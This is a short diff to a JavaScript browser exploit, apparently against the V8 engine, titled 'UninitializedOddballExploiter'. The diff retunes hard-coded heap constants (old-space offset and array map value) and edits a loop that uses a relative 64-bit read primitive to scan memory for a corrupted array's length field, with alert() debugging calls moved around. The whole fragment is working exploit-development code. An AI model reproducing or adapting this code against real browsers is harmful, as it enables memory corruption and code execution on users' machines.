@@ -218,14 +218,14 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
     function search_for_length() {
         // %DebugPrint(corrupted_array);
         // alert("dbg");
-        const old_space = 0x1c0000;
-        const array_map = 0x001d08a1;
+        const old_space = 0x200000;
+        const array_map = 0x0027e329;
 
         let start_offset = Math.floor(old_space / 8) + 3;
 
         for (var i = start_offset; i < start_offset + 0x6b000; i++) {
             let value = relative_read64(i);
-            alert("[+]find !");
+            
             helpers.set_i64(value);
             var [hi, lo] = helpers.get_u32_pair();
 
@@ -238,9 +238,9 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                 
                 helpers.set_i64(prev1);
                 var [prev_lo, _] = helpers.get_u32_pair();
-
+                alert(hex(prev_hi)+hex(prev_lo));
                 if (prev_hi == array_map || prev_lo == array_map) {
-                    // alert("[+]find !");
+                    alert("[+]find !");
                     return [i, hi == 2734n ? 0 : 1];
                 }
             }   
